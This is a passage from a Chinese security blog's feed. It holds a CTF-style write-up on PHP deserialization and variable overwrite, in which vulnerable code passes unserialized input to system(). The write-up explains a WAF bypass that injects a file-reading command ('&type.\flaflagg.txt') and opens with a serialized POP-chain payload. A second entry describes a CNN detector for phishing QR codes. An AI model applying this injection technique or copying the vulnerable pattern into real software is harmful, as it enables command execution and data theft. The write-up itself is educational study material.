class="line">O:8:&quot;start_gg&quot;:2:&#123;s:4:&quot;mod1&quot;;O:4:&quot;Call&quot;:2:&#123;s:4:&quot;mod1&quot;;O:5:&quot;funct&quot;:2:&#123;s:4:&quot;mod1&quot;;O:4:&quot;func&quot;:2:&#123;s:4:&quot;mod1&quot;;O:7:&quot;string1&quot;:2:&#123;s:4:&quot;str1&quot;;O:7:&quot;GetFlag&quot;:0:&#123;&#125;s:4:&quot;str2&quot;;N;&#125;s:4:&quot;mod2&quot;;N;&#125;s:4:&quot;mod2&quot;;N;&#125;s:4:&quot;mod2&quot;;N;&#125;s:4:&quot;mod2&quot;;N;&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;PHP反序列化漏洞&quot;&gt;&lt;a href=&quot;#PHP反序列化漏洞&quot; class=&quot;headerlink&quot; title=&quot;PHP反序列化漏洞&quot;&gt;&lt;/a&gt;PHP反序列化漏洞&lt;/h1&gt;&lt;h3 id=&quot;PHP序列化与反序列化意义&quot;&gt;&lt;a href=&quot;#PHP序列化与反序列化意义&quot; class=&quot;headerlink&quot; title=&quot;PHP序列化与反序列化意义&quot;&gt;&lt;/a&gt;PHP序列化与反序列化意义&lt;/h3&gt;&lt;p&gt;在开发的过程中常常遇到需要把&lt;strong&gt;对象&lt;/strong&gt;或者&lt;strong&gt;数组&lt;/strong&gt;进行序列号存储，反序列化输出的情况。特别是当需要把数组存储到mysql数据库中时，我们时常需要将数组进行序列号操作。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;序列化&lt;/strong&gt;（串行化）：是将变量转换为可保存或传输的字符串的过程；&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;反序列化&lt;/strong&gt;（反串行化）：就是在适当的时候把这个字符串再转化成原来的变量使用。&lt;/p&gt;
&lt;p&gt;这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。&lt;/p&gt;
&lt;p&gt;常见的php系列化和反系列化方式主要有：serialize，unserialize；json_encode，json_decode。 &lt;/p&gt;</summary>
    
    
    
    
    <category term="php反序列化" scheme="http://example.com/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化案例</title>
    <link href="http://example.com/2020/11/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2020/11/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2020-11-09T00:36:36.000Z</published>
    <updated>2020-11-09T01:09:55.139Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PHP反序列化漏洞案例"><a href="#PHP反序列化漏洞案例" class="headerlink" title="PHP反序列化漏洞案例"></a>PHP反序列化漏洞案例</h2><p>在看php反序列化的时候遇到下面这个题，来自于：<a href="https://www.cnblogs.com/nul1/p/9928797.html%E3%80%82%E7%84%B6%E5%90%8E%E8%A7%A3%E7%AD%94%E6%9D%A5%E8%87%AA%E4%BA%8Ehttps://www.freebuf.com/articles/web/167721.html%E3%80%82%E8%BF%99%E9%87%8C%E6%88%91%E5%B0%B1%E8%AF%B4%E4%B8%8B%E6%88%91%E8%B8%8F%E8%BF%87%E7%9A%84%E5%9D%91%E3%80%82">https://www.cnblogs.com/nul1/p/9928797.html。然后解答来自于https://www.freebuf.com/articles/web/167721.html。这里我就说下我踏过的坑。</a></p><a id="more"></a><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">come</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$args</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = <span class="variable">$method</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = <span class="variable">$args</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;args[<span class="variable">$k</span>] = <span class="keyword">$this</span>-&gt;waf(trim(<span class="variable">$v</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$str</span>=preg_replace(<span class="string">&quot;/[&lt;&gt;*;|?\n ]/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span>=str_replace(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echos</span>(<span class="params"><span class="variable">$host</span></span>)</span>&#123;</span><br><span class="line">        system(<span class="string">&quot;echo <span class="subst">$host</span>&quot;</span>.<span class="variable">$host</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">&quot;echos&quot;</span>))) &#123;</span><br><span class="line">            call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$first</span>=<span class="string">&#x27;hi&#x27;</span>;</span><br><span class="line"><span class="variable">$var</span>=<span class="string">&#x27;var&#x27;</span>;</span><br><span class="line"><span class="variable">$bbb</span>=<span class="string">&#x27;bbb&#x27;</span>;</span><br><span class="line"><span class="variable">$ccc</span>=<span class="string">&#x27;ccc&#x27;</span>;</span><br><span class="line"><span class="variable">$i</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$i</span>===<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$i</span>++;</span><br><span class="line">            <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;<span class="keyword">break</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$first</span>===<span class="string">&quot;doller&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    @parse_str(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$var</span>===<span class="string">&quot;give&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$bbb</span>===<span class="string">&quot;me&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$ccc</span>===<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;welcome!&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="variable">$come</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;come&#x27;</span>];</span><br><span class="line">                unserialize(<span class="variable">$come</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;think about it&lt;br&gt;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;NO&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Can you hack me?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面代码可以分为两个阶段来看，第一个阶段就是如何进入到下面的反序列化代码中，第二个如何利用反序列化进行代码执行。</p><h3 id="第一阶段"><a href="#第一阶段" class="headerlink" title="第一阶段"></a>第一阶段</h3><p>代码片段如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$first</span>=<span class="string">&#x27;hi&#x27;</span>;</span><br><span class="line"><span class="variable">$var</span>=<span class="string">&#x27;var&#x27;</span>;</span><br><span class="line"><span class="variable">$bbb</span>=<span class="string">&#x27;bbb&#x27;</span>;</span><br><span class="line"><span class="variable">$ccc</span>=<span class="string">&#x27;ccc&#x27;</span>;</span><br><span class="line"><span class="variable">$i</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$i</span>===<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="variable">$i</span>++;</span><br><span class="line">            <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;<span class="keyword">break</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$first</span>===<span class="string">&quot;doller&quot;</span>)&#123;</span><br><span class="line">    @parse_str(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$var</span>===<span class="string">&quot;give&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$bbb</span>===<span class="string">&quot;me&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$ccc</span>===<span class="string">&quot;flag&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;welcome!&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="variable">$come</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;come&#x27;</span>];</span><br><span class="line">                unserialize(<span class="variable">$come</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;think about it&lt;br&gt;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;NO&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Can you hack me?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到有两个<code>$$</code>直接反手一个变量覆盖，直接访问：<a href="http://127.0.0.1/test.php?first=doller&amp;var=give&amp;bbb=me&amp;ccc=flag%E3%80%82">http://127.0.0.1/test.php?first=doller&amp;var=give&amp;bbb=me&amp;ccc=flag。</a></p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109090938.png" alt="image-20201108152053284"></p><p>这怎么是个NO，仔细一看才知道这个变量覆盖只能利用一次，i++之后就进不去了。那只能往下看，注意到有个<code>parse_str</code>的函数。这个函数的作用如下，将键值对中的键直接变成了变量。</p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109090603.png" alt="image-20201108152430924"></p><p>这会儿就要怎么考虑利用这个<code>a</code>了。浏览器在发起URL时，<strong>猜测</strong>本地应该会先分割，先用<code>&amp;</code>作为分割符，然后传输。</p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109090608.png" alt="image-20201108153321042"></p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109090832.png" alt="image-20201108153527236"></p><p>对<code>&amp;</code>进行url编码后，后面所有的东西都会被浏览器当成a的值，这个时候才发送出去。</p><h3 id="第二阶段"><a href="#第二阶段" class="headerlink" title="第二阶段"></a>第二阶段</h3><p>反序列化漏洞，变量覆盖之类的可以忽略了。简化代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">come</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$args</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = <span class="variable">$method</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = <span class="variable">$args</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;args[<span class="variable">$k</span>] = <span class="keyword">$this</span>-&gt;waf(trim(<span class="variable">$v</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$str</span>=preg_replace(<span class="string">&quot;/[&lt;&gt;*|;?\n ]/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span>=str_replace(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echos</span>(<span class="params"><span class="variable">$host</span></span>)</span>&#123;</span><br><span class="line">        system(<span class="string">&quot;echo <span class="subst">$host</span>&quot;</span>.<span class="variable">$host</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">&quot;echos&quot;</span>))) &#123;</span><br><span class="line">            call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$come</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;come&#x27;</span>];</span><br><span class="line">unserialize(<span class="variable">$come</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>假设</strong>此时外部传入序列化后的字符串，函数调用顺序为：<code>wakeup  --&gt;  waf  --&gt;  destruct  --&gt;  echos</code>。然后随便写一个payload测试下：</p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109090635.png" alt="image-20201108155315502"></p><p>拿着这一串payload直接上，输出见下图。</p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109090643.png" alt="image-20201108155406597"></p><p>然后就是过滤。直接看freebuf那片文章就行。在作者这篇文章中，给args传参为<code>&amp;type.\flaflagg.txt</code>，但是我测试了好久，始终没读到数据，然后调试发现那个<code>&amp;</code>有问题，发过去了服务端接收不了，所以一直报错。</p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109090648.png" alt="image-20201108160403920"></p><p>然后使用url编码后，就直接能绕过去了。</p><p><img src="https://raw.githubusercontent.com/unihac/picGo/master/images/20201109090654.png" alt="image-20201108160449377"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;PHP反序列化漏洞案例&quot;&gt;&lt;a href=&quot;#PHP反序列化漏洞案例&quot; class=&quot;headerlink&quot; title=&quot;PHP反序列化漏洞案例&quot;&gt;&lt;/a&gt;PHP反序列化漏洞案例&lt;/h2&gt;&lt;p&gt;在看php反序列化的时候遇到下面这个题，来自于：&lt;a href=&quot;https://www.cnblogs.com/nul1/p/9928797.html%E3%80%82%E7%84%B6%E5%90%8E%E8%A7%A3%E7%AD%94%E6%9D%A5%E8%87%AA%E4%BA%8Ehttps://www.freebuf.com/articles/web/167721.html%E3%80%82%E8%BF%99%E9%87%8C%E6%88%91%E5%B0%B1%E8%AF%B4%E4%B8%8B%E6%88%91%E8%B8%8F%E8%BF%87%E7%9A%84%E5%9D%91%E3%80%82&quot;&gt;https://www.cnblogs.com/nul1/p/9928797.html。然后解答来自于https://www.freebuf.com/articles/web/167721.html。这里我就说下我踏过的坑。&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="php反序列化" scheme="http://example.com/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>基于CNN的二维码钓鱼检测</title>
    <link href="http://example.com/2020/08/08/%E5%9F%BA%E4%BA%8ECNN%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81%E9%92%93%E9%B1%BC%E9%93%BE%E6%8E%A5%E6%A3%80%E6%B5%8B/"/>
    <id>http://example.com/2020/08/08/%E5%9F%BA%E4%BA%8ECNN%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%9A%84%E4%BA%8C%E7%BB%B4%E7%A0%81%E9%92%93%E9%B1%BC%E9%93%BE%E6%8E%A5%E6%A3%80%E6%B5%8B/</id>
    <published>2020-08-08T15:33:15.000Z</published>
    <updated>2021-02-04T05:16:51.640Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基于深度学习的二维码钓鱼检测"><a href="#基于深度学习的二维码钓鱼检测" class="headerlink" title="基于深度学习的二维码钓鱼检测"></a>基于深度学习的二维码钓鱼检测</h1><h2 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h2><p>​        网络钓鱼是攻击者利用欺骗性的邮件和伪造的web站点进行网络诈骗，受害者往往会泄露自己的个人信息，如身份证、信用卡、各类密码等。诈骗者会将网站伪造的和正常网站一样，可以是更新flash界面、游戏活动登录领取奖励等界面，从而植入木马或者盗取用户信息。然而最近新出现的扫描二维码实现钓鱼也频频出现在各种场合。</p><p>​        最近偶然看到<code>Kali Linux</code>上出现了一种二维码的恶意链接钓鱼方式（以前没怎么使用过，没太关注）。这种方式比直接使用URL进行钓鱼要更加隐蔽一些，下面使用<code>TIM</code>和<code>微信</code>截屏证明了。于是就想能不能使用卷积神经网络识别含有恶意链接的二维码，最终发现使用CNN神经网络识别恶意的URL的成功率竟然能达到80%。</p><h2 id="Kali-Linux-生成恶意二维码"><a href="#Kali-Linux-生成恶意二维码" class="headerlink" title="Kali Linux 生成恶意二维码"></a>Kali Linux 生成恶意二维码</h2><p>点开 <code>Social-Engineer Toolkit</code></p><p><img src="/images/image-20200806224745793.png" alt="image-20200806224745793"></p><p>然后就能看到<code>QRCode Generator Attack Vector</code></p><p><img src="/images/image-20200806224817953.png" alt="image-20200806224817953"></p><p>以百度为例，生成一个二维码</p><p><img src="/images/image-20200806225114742.png" alt="image-20200806225114742"></p><p>生成的二维码如图所示，使用微信扫码直接能打开百度网页。</p><img src="/images/image-20200806225341844.png" width="150px" height="150px" /><h2 id="卷积神经网络识别恶意二维码"><a href="#卷积神经网络识别恶意二维码" class="headerlink" title="卷积神经网络识别恶意二维码"></a>卷积神经网络识别恶意二维码</h2><h3 id="数据准备"><a href="#数据准备" class="headerlink" title="数据准备"></a>数据准备</h3><p>从Kaggle数据上下载了一些恶意的钓鱼URL，数据情况如下：</p><p><img src="/images/image-20200806231132522.png" alt="image-20200806231132522"></p><p>然后清洗数据集（删除过于长的url），使用python直接转换成二维码的形式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">qr = qrcode.QRCode(version=<span class="number">2</span>, error_correction=qrcode.constants.ERROR_CORRECT_L,</span><br><span class="line">box_size=<span class="number">5</span>, border=<span class="number">0</span>) <span class="comment">#设置二维码的大小</span></span><br><span class="line">qr.add_data(<span class="string">&quot;https://www.baidu.com&quot;</span>)</span><br><span class="line">qr.make(fit=<span class="literal">True</span>)</span><br><span class="line">img = qr.make_image()</span><br><span class="line">img.save(<span class="string">&quot;./baidu.png&quot;</span>)</span><br></pre></td></tr></table></figure><p>使用上面生成的二维码图像如下，这时候使用微信和qq直接扫二维码就能直接打开网页</p><p><img src="/images/test.png" alt="test"></p><p>并且可以看到使用<code>微信</code>和<code>qq</code>扫描二维码打开的网页并没有地址栏显示URL，如下图：</p><p><img src="/images/Screenshot_20200808_221519.jpg" width=300 />                                                 <img src="/images/Screenshot_20200808_221459.jpg" width=300 /></p><p>左图是使用TIM扫码打开的网页，右图是使用微信扫码打开的网页。均没有显示url地址栏，这样的钓鱼方式比起直接使用url钓鱼更加隐蔽。</p><h3 id="检测模型的搭建"><a href="#检测模型的搭建" class="headerlink" title="检测模型的搭建"></a>检测模型的搭建</h3><p>卷积神经网络模型由两个卷积层、两个池化层以及一个全连接层组成：</p><img src="/images/model.png" width=400 /><p>卷积神经网络模型源代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">model = Sequential()</span><br><span class="line">model.add(Conv2D(<span class="number">32</span>, kernel_size=(<span class="number">3</span>, <span class="number">3</span>), activation=<span class="string">&#x27;relu&#x27;</span>, input_shape=input_shape)) <span class="comment"># 32个过滤器，过滤器大小是3×3，32×26×26</span></span><br><span class="line">model.add(MaxPooling2D(pool_size=(<span class="number">2</span>, <span class="number">2</span>)))<span class="comment"># 向下取样</span></span><br><span class="line">model.add(Conv2D(<span class="number">64</span>, (<span class="number">3</span>, <span class="number">3</span>), activation=<span class="string">&#x27;relu&#x27;</span>)) <span class="comment">#64×24×24</span></span><br><span class="line">model.add(MaxPooling2D(pool_size=(<span class="number">2</span>, <span class="number">2</span>)))<span class="comment"># 向下取样</span></span><br><span class="line">model.add(Dropout(<span class="number">0.25</span>))</span><br><span class="line">model.add(Flatten()) <span class="comment">#降维：将64×12×12降为1维（即把他们相乘起来）</span></span><br><span class="line">model.add(Dense(<span class="number">128</span>, activation=<span class="string">&#x27;relu&#x27;</span>))</span><br><span class="line">model.add(Dropout(<span class="number">0.5</span>))</span><br><span class="line">model.add(Dense(num_classes, activation=<span class="string">&#x27;softmax&#x27;</span>)) <span class="comment">#全连接2层</span></span><br></pre></td></tr></table></figure><h3 id="模型评估"><a href="#模型评估" class="headerlink" title="模型评估"></a>模型评估</h3><p>使用测试集40000多个图片对模型迭代训练到12个epoch，模型准确率能够高达80%左右。这里我尝试了再次多增加几个epoch，但是验证集的准确率并没有增加，二训练集的准确率增加了，说明模型过拟合了，因此准确率只能达到80%左右。损失值和准确率曲线变化图如下</p><p><img src="/images/loss.png" alt="loss"><img src="/images/acc.png" alt="acc">     </p><p>左边是损失值函数图像，右边是准确率图像。</p><h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><p>偶然，我的发小说一个不认识的人给他发了一个二维码，咳咳。于是突然想起自己刚写的基于CNN的恶意二维码识别检测。</p><img src="/images/5065d0f35e82af08cf1da144697d627.jpg" width=300 /><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20200811114739.png" alt="TIM截图20200811114739"></p><p>只有两个类别，所以有两个数字。分别对应是<code>正常url的概率</code>与<code>恶意url的概率</code>，可以看到我朋友发的这个二维码包含恶意url的概率直接是100%。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>目前钓鱼的方式层出不穷，使用二维码钓鱼也算是另辟蹊径了。关于如何提高针对二维码钓鱼的攻击还需有待提高。</p><h3 id="代码托管"><a href="#代码托管" class="headerlink" title="代码托管"></a>代码托管</h3><p>[<a href="https://github.com/unihac/Machine-Learning/tree/master/Malcious%20QR%20code]">https://github.com/unihac/Machine-Learning/tree/master/Malcious%20QR%20code]</a>(<a href="https://github.com/unihac/Machine-Learning/tree/master/Malcious">https://github.com/unihac/Machine-Learning/tree/master/Malcious</a> QR code)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;基于深度学习的二维码钓鱼检测&quot;&gt;&lt;a href=&quot;#基于深度学习的二维码钓鱼检测&quot; class=&quot;headerlink&quot; title=&quot;基于深度学习的二维码钓鱼检测&quot;&gt;&lt;/a&gt;基于深度学习的二维码钓鱼检测&lt;/h1&gt;&lt;h2 id=&quot;0x01前言&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    <category term="机器学习" scheme="http://example.com/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>动态代码防御机制</title>
